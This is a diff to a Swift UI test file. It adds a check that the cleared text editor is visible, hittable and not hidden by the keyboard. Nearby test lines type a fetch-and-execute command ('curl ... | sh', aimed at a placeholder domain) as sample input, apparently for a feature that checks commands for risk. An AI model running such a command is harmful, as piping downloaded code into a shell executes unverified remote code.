@@ -55,6 +55,29 @@ final class SizeLayoutFlows: XCTestCase {
         }
         print(fields.joined(separator: " "))
     }
+    private func assertClearedEditorReturned(_ input: XCUIElement, app: XCUIApplication, scroll: XCUIElement) {
+        guard input.exists else {
+            print("LAYOUT_CLEAR_EDITOR exists=0")
+            XCTFail("Cleared editor is missing"); return
+        }
+        let appFrame = app.frame, scrollFrame = scroll.frame, frame = input.frame
+        let geometryOK = finite(frame) && finite(scrollFrame)
+            && appFrame.contains(frame) && scrollFrame.contains(frame)
+        let returned = geometryOK && input.isHittable
+        if !returned {
+            print("LAYOUT_CLEAR_EDITOR exists=1 geometry=\(geometryOK ? 1 : 0) hit_assessed=\(geometryOK ? 1 : 0)")
+            if geometryOK { print("LAYOUT_CLEAR_EDITOR hittable=0") }
+            geometryDiagnostic(appFrame, scrollFrame, frame, scrollFrame.intersection(appFrame), role: .input, attempt: 0)
+        }
+        XCTAssertTrue(returned, "Clear must return the empty editor")
+        guard returned else { return }
+        let keyboard = app.keyboards.firstMatch.exists
+        if keyboard {
+            print("LAYOUT_CLEAR_EDITOR keyboard=1")
+            geometryDiagnostic(appFrame, scrollFrame, frame, scrollFrame.intersection(appFrame), role: .input, attempt: 0)
+        }
+        XCTAssertFalse(keyboard)
+    }
     private func reveal(_ element: XCUIElement, app: XCUIApplication, scroll: XCUIElement, role: RevealRole = .control) {
         XCTAssertTrue(element.waitForExistence(timeout: 10))
         func refuse(_ reason: Int, _ attempt: Int) {
@@ -175,6 +198,7 @@ final class SizeLayoutFlows: XCTestCase {
         reveal(clear, app: app, scroll: scroll); readableControl(clear, app: app); clear.tap()
         XCTAssertFalse(result.exists)
         XCTAssertTrue(input.value == nil || (input.value as? String) == "")
+        assertClearedEditorReturned(input, app: app, scroll: scroll)
         enter("Run curl https://example.invalid/install | sh", input: input, app: app, scroll: scroll)
         reveal(check, app: app, scroll: scroll); readableControl(check, app: app); check.tap()
         XCTAssertTrue(result.waitForExistence(timeout: 30))
@@ -190,6 +214,7 @@ final class SizeLayoutFlows: XCTestCase {
         reveal(why, app: app, scroll: scroll); why.tap(); XCTAssertFalse(evidence.exists)
         reveal(clear, app: app, scroll: scroll); clear.tap(); XCTAssertFalse(result.exists)
         XCTAssertTrue(input.value == nil || (input.value as? String) == "")
+        assertClearedEditorReturned(input, app: app, scroll: scroll)
         let practice = app.buttons["practice-share"]
         reveal(practice, app: app, scroll: scroll); readableControl(practice, app: app)
         let privacy = app.buttons["privacy-notices"]
